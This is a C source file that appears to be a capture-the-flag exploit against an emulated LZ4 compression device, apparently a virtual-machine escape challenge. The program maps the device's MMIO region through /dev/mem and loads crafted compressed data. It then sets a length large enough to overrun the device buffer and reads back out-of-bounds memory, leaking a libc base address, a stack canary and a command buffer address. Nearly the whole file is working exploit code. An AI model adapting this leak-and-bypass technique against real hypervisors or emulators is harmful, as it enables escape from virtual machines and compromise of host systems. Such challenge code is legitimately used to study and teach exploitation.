#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/xattr.h>

#include <linux/btrfs.h>
#include <linux/capability.h>
#include <linux/sysctl.h>
#include <linux/types.h>
#include <linux/userfaultfd.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define DEBUG
#ifdef DEBUG

#define logOK(msg, ...) dprintf(STDERR_FILENO, "[+] " msg "\n", ##__VA_ARGS__)
#define logInfo(msg, ...) dprintf(STDERR_FILENO, "[*] " msg "\n", ##__VA_ARGS__)
#define logErr(msg, ...) dprintf(STDERR_FILENO, "[!] " msg "\n", ##__VA_ARGS__)
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

#define asm __asm__

#define PAGE_SIZE 0x1000



void *mmio_mem;

void mmio_write(uint64_t hwaddr, uint64_t value)
{
    *(uint64_t *)((u64)mmio_mem + hwaddr) = value;
}

u32 mmio_read(u32 hwaddr){
    return *(u32*)((u64)mmio_mem + hwaddr);
}

u64 file_len = 2040;

struct file{
    char *name;
    u64 file_len;
};
#define LZ4DEV_OFFSET_ID 0x00
#define LZ4DEV_OFFSET_LEN 0x08
#define LZ4DEV_OFFSET_TRIGGER 0x10
#define LZ4DEV_INBUF 0x20

#define REG_ID                 0x0
#define CHIP_ID                0xf001

#define LZ4_MMIO 0x0b000000

void set_len(uint32_t len){
    mmio_write(LZ4DEV_OFFSET_LEN, len);
}
void compress(){
    mmio_write(LZ4DEV_OFFSET_TRIGGER, 0);
}
int main(int argc, char *argv[]){
    int fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (fd < 0){
        logErr("Failed to open /dev/mem");
    }
    mmio_mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, LZ4_MMIO);
    if (mmio_mem == MAP_FAILED){
        logErr("Failed to map mmio");
    }
    struct file compressed_file;
    if (argc == 2){
        compressed_file.name = "haha.lz4";
        compressed_file.file_len = 2040;
    }
    if (argc == 3){
        compressed_file.name = "haha2.lz4";
        compressed_file.file_len = 100;
    }
    char content[compressed_file.file_len];
    
    int target_fd = open(compressed_file.name, O_RDONLY);
    if (target_fd < 0){
        logErr("Failed to open compressed file");
    }
    read(target_fd, content, compressed_file.file_len);

    for (u32 i = 0; i < compressed_file.file_len; i += 4){
        u32 val = *(u32*)((char*)content + i);
        mmio_write(0x20 + i, val);
    }
    mmio_write(LZ4DEV_OFFSET_LEN, file_len);
    mmio_write(0x10, 0x0);
    if (argc == 3){
        exit(1);
    }
    u64 libc;

    libc = (u64)((u64)mmio_read(2636) << 32) + mmio_read(2632) - 0xac1c5;
    printf("Libc: 0x%llx\n", libc);
    u64 canary;
    canary = (u64)((u64)mmio_read(2572) << 32) + mmio_read(2568);
    printf("Canary: 0x%llx\n", canary);
    u64 cmd;
    cmd = (u64)((u64)mmio_read(2628) << 32) + mmio_read(2624) - 0xab0;
    printf("Cmd address: 0x%llx\n", cmd);
}  
